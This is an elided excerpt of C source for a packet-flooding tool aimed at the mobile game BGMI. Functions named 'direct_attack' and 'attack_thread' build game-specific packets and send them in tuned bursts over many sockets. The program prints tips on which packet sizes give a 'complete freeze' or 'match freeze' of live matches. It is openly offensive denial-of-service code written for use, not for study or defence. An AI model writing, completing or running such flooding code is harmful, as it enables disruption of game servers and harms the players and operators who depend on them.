...
void *direct_attack(void *arg) {
    ...
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0 && packets[i]) {
            create_bgmi_packet(packets[i], PACKET_SIZE, thread_idx + 1000, 0, &seed);
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            for (int b = 0; b < optimal_burst && !atomic_load(&stop_signal); b++) {
...
void *attack_thread(void *arg) {
    ...
    create_bgmi_packet(packet, PACKET_SIZE, tid, 0, &seed);
    ...
    if (PACKET_SIZE <= 40) {
        packets_per_burst = 80 + (tid % 40);
        sleep_microseconds = 2000;
    } else if (PACKET_SIZE <= 60) {
        packets_per_burst = 50 + (tid % 30);
        sleep_microseconds = 5000;
    } else {
        packets_per_burst = 30 + (tid % 20);
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        for (int b = 0; b < packets_per_burst && !atomic_load(&stop_signal); b++) {
...
int main(int argc, char *argv[]) {
    ...
    if (PACKET_SIZE < 40) {
        printf("💡 Tip: Use 56-72 bytes for complete freeze\n");
    } else if (PACKET_SIZE < 56) {
        printf("💡 Tip: Good for disruption\n");
    } else if (PACKET_SIZE >= 64) {
        printf("💡 Tip: Perfect for match freeze + notice!\n");
    }
    printf("\n");
